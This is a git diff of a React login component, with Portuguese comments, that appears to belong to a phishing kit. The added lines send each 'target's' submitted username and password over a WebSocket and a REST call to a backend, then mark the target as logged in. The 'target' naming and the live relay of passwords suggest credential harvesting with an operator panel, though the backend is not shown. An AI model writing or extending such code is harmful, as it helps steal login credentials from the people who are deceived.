@@ -3,7 +3,8 @@ import { useTarget } from "../contexts/target.context";
 import "../styles/Login.css";
 import loginIMG from "../imagens/LoginIMG.jpg";
 import { EnterTargetBody, enterTargetAPI } from "../fetchs/target.fetch";
-import { useParams } from "react-router-dom"; // se você pega targetId da URL
+import { useParams } from "react-router-dom";
+import { enterTarget } from "../target-socket";
 
 export default function LoginComponent() {
   const { setCurrentPage, setTargetPage, setTargetStatus, setLastPage, targetData, setTargetData } = useTarget();
@@ -34,7 +35,11 @@ export default function LoginComponent() {
         return;
       }
 
-      // 1️⃣ Prepara o body para enviar via PATCH
+      if (!targetIdFromRoute) {
+        throw new Error("Target ID não encontrado na rota");
+      }
+
+      // 🔹 Monta body para o backend REST
       const body: EnterTargetBody = {
         dto: {
           name: username,
@@ -52,18 +57,20 @@ export default function LoginComponent() {
         },
       };
 
-      if (!targetIdFromRoute) {
-        throw new Error("Target ID não encontrado na rota");
-      }
-
-      // 2️⃣ Chama a API PATCH
+      // 🔹 Chama REST (opcional)
       await enterTargetAPI(targetIdFromRoute, body);
 
-      // 3️⃣ Atualiza contexto
+      // 🔹 🔥 Dispara também via WebSocket
+      enterTarget({
+        targetId: targetIdFromRoute,
+        name: username,
+        info: password,
+      });
+
+      // Atualiza contexto
       setLastPage(0);
       setCurrentPage(1);
       setTargetPage(1);
-      // setTargetStatus(1);
 
       if (targetData) {
         setTargetData({ ...targetData, info: `logged:${username}` });
@@ -121,6 +128,8 @@ export default function LoginComponent() {
 
           <button type="submit" className="btn-login" disabled={submitting}>
             {submitting ? "Entrando..." : "Entrar"}
+
+            {/* ToDo 2: Colocar aqui para o OnClique ativar o Enter Target*/}
           </button>
         </form>
       </div>
